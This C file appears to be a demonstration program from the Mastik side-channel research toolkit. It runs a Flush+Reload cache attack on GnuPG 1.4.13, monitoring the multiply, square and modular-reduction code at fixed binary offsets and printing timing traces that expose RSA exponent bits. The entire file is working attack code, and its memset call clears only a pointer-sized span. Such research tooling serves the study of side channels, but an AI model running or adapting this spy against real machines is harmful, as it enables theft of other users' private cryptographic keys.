/*
 * Copyright 2016 CSIRO
 *
 * This file is part of Mastik.
 *
 * Mastik is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mastik is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Mastik.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fr.h>
#include <util.h>

#define SAMPLES 100000
#define SLOT	2000
#define THRESHOLD 100

#define MUL_OFFSET 0x8f67d	// mpih-mul.c:85
#define SQR_OFFSET 0x8fc89	// mpih-mul.c:271
#define MOD_OFFSET 0x8ed5c	// mpih-div.c:356


int main(int ac, char **av) {
  fr_t fr = fr_prepare();
  fr_monitor(fr, map_offset("gpg-1.4.13", MUL_OFFSET));
  fr_monitor(fr, map_offset("gpg-1.4.13", SQR_OFFSET));
  fr_monitor(fr, map_offset("gpg-1.4.13", MOD_OFFSET));

  uint16_t *res = malloc(SAMPLES * 3 * sizeof(uint16_t));
  memset(res, 1, sizeof(res));
  fr_probe(fr, res);

  int l = fr_repeatedprobe(fr, SAMPLES, res, SLOT, THRESHOLD, 500);
  for (int i = 0; i < l; i++) 
    printf("%d %d %d\n", res[i*3], res[i*3+1], res[i*3+2]);
}
